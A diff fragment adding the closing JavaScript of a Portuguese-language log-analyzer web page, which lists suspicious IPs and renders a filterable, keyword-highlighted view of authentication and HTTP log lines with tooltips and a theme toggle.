+    return h("div", { class: "seq-row" },
+      h("div", { class: "seq-who" }, ipButton(a.ip), badge(a.risk)),
+      h("div", null,
+        h("div", { class: "seq" }, chips, extra > 0 ? h("span", { class: "muted" }, " +" + nf.format(extra)) : null),
+        h("div", { class: "seq-sum" },
+          plural(a.failed, ...L.failed_unit) + " · " + plural(a.accepted, ...L.accepted_unit) +
+          (a.median_gap != null ? " · " + nf.format(a.median_gap) + " s entre eventos" : "")))
+    );
+  }) : [h("p", { class: "muted" }, "Nenhum evento suspeito.")]));
+
+  // ---------- Log ----------
+  const state = { kind: "all", ip: "", q: "" };
+  const kindFilter = $("#kind-filter");
+  for (const [key, label] of D.log_filters) {
+    kindFilter.append(h("button", { type: "button", "data-kind": key, "aria-pressed": String(key === state.kind),
+      onclick: () => { state.kind = key; renderLog(); } }, label));
+  }
+  const ipFilter = $("#ip-filter");
+  ipFilter.append(h("option", { value: "" }, "Todos os IPs"), ...D.attackers.map((a) => h("option", { value: a.ip }, a.ip)));
+  ipFilter.addEventListener("change", () => { state.ip = ipFilter.value; renderLog(); });
+  const search = $("#search");
+  let searchTimer;
+  search.addEventListener("input", () => {
+    clearTimeout(searchTimer);
+    searchTimer = setTimeout(() => { state.q = search.value.trim().toLowerCase(); renderLog(); }, 120);
+  });
+
+  // IPs clicáveis: só os IPs analisados (v4 e v6), casados por inteiro.
+  const escapeRe = (s) => s.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
+  const ipAlternatives = Object.keys(byIp).sort((a, b) => b.length - a.length).map(escapeRe).join("|");
+  const KEYWORDS = "Failed|Accepted|Invalid user|GET|POST|PUT|DELETE|HEAD";
+  const TOKEN = new RegExp(
+    (ipAlternatives ? "(?<![\\w:.])(" + ipAlternatives + ")(?![\\w:])|" : "()") + "\\b(" + KEYWORDS + ")\\b", "g");
+  function highlight(text) {
+    const out = [];
+    let last = 0;
+    for (const m of text.matchAll(TOKEN)) {
+      if (!m[0]) continue;
+      if (m.index > last) out.push(text.slice(last, m.index));
+      if (m[1]) out.push(h("span", { class: "hl-ip", "data-ip": m[1], "data-tip": "Filtrar por " + m[1] }, m[1]));
+      else out.push(h("span", { class: "hl-kw" }, m[2]));
+      last = m.index + m[0].length;
+    }
+    out.push(text.slice(last));
+    return out;
+  }
+
+  const MAX_ROWS = 2000;
+  const logEl = $("#log");
+  logEl.addEventListener("click", (e) => {
+    const ip = e.target.closest(".hl-ip");
+    if (ip) showIp(ip.dataset.ip, false);
+  });
+  const filterKinds = Object.fromEntries(D.log_filters.map(([key, , kinds]) => [key, new Set(kinds)]));
+  function matches([, k, t, ip]) {
+    const kinds = filterKinds[state.kind];
+    if (kinds.size && !kinds.has(k)) return false;
+    if (state.ip && ip !== state.ip) return false;
+    if (state.q && !t.toLowerCase().includes(state.q)) return false;
+    return true;
+  }
+  function renderLog() {
+    for (const b of kindFilter.querySelectorAll("button")) b.setAttribute("aria-pressed", String(b.dataset.kind === state.kind));
+    ipFilter.value = state.ip;
+    const rows = D.lines.filter(matches);
+    const shown = rows.slice(0, MAX_ROWS);
+    logEl.replaceChildren(...shown.map(([n, k, t]) => {
+      const crit = critLines.has(n);
+      return h("div", { class: "log-row", id: "L" + n },
+        h("span", { class: "ln" }, n),
+        h("span", { class: "k " + k + (crit ? " crit" : "") }, crit ? "CRÍTICO" : (D.kind_labels[k] || "")),
+        h("span", { class: "txt" }, highlight(t)));
+    }));
+    if (!shown.length) logEl.append(h("div", { class: "log-row" }, h("span"), h("span"), h("span", { class: "muted" }, "Nenhuma linha com esses filtros.")));
+    $("#log-count").textContent = "Mostrando " + nf.format(shown.length) + " de " + plural(rows.length, "linha", "linhas") +
+      (rows.length > MAX_ROWS ? " — refine os filtros para ver o resto." : ".") +
+      (D.lines_note ? " " + D.lines_note : "");
+  }
+
+  function showIp(ip, scroll = true) {
+    state.ip = ip; state.kind = "all";
+    renderLog();
+    if (scroll) $("#log-card").scrollIntoView({ behavior: "smooth", block: "start" });
+  }
+  function jumpTo(n) {
+    let row = document.getElementById("L" + n);
+    if (!row) {
+      state.kind = "all"; state.ip = ""; state.q = ""; search.value = "";
+      renderLog();
+      row = document.getElementById("L" + n);
+    }
+    if (!row) return;
+    $("#log-card").scrollIntoView({ behavior: "smooth", block: "start" });
+    setTimeout(() => {
+      logEl.scrollTop = row.offsetTop - logEl.offsetTop - logEl.clientHeight / 3;
+      row.classList.remove("flash");
+      void row.offsetWidth;
+      row.classList.add("flash");
+    }, 250);
+  }
+  renderLog();
+
+  // ---------- Tooltip ----------
+  const tip = $("#tip");
+  function placeTip(x, y) {
+    const pad = 12, r = tip.getBoundingClientRect();
+    let left = x + pad, topY = y + pad;
+    if (left + r.width > innerWidth - 8) left = x - r.width - pad;
+    if (topY + r.height > innerHeight - 8) topY = y - r.height - pad;
+    tip.style.left = Math.max(8, left) + "px";
+    tip.style.top = Math.max(8, topY) + "px";
+  }
+  function showTip(target, x, y) {
+    tip.textContent = target.dataset.tip;
+    tip.hidden = false;
+    placeTip(x, y);
+  }
+  document.addEventListener("mouseover", (e) => {
+    const t = e.target.closest("[data-tip]");
+    if (t) showTip(t, e.clientX, e.clientY); else tip.hidden = true;
+  });
+  document.addEventListener("mousemove", (e) => { if (!tip.hidden) placeTip(e.clientX, e.clientY); });
+  document.addEventListener("focusin", (e) => {
+    const t = e.target.closest("[data-tip]");
+    if (!t) { tip.hidden = true; return; }
+    const r = t.getBoundingClientRect();
+    showTip(t, r.left, r.bottom);
+  });
+  document.addEventListener("focusout", () => { tip.hidden = true; });
+  addEventListener("scroll", () => { tip.hidden = true; }, { passive: true });
+
+  // ---------- Tema ----------
+  const root = document.documentElement;
+  try { const saved = localStorage.getItem("log-analyzer-theme"); if (saved) root.dataset.theme = saved; } catch (_) {}
+  $("#theme").addEventListener("click", () => {
+    const current = root.dataset.theme || (matchMedia("(prefers-color-scheme: dark)").matches ? "dark" : "light");
+    const next = current === "dark" ? "light" : "dark";
+    root.dataset.theme = next;
+    try { localStorage.setItem("log-analyzer-theme", next); } catch (_) {}
+  });
+})();
+</script>
+</body>
+</html>
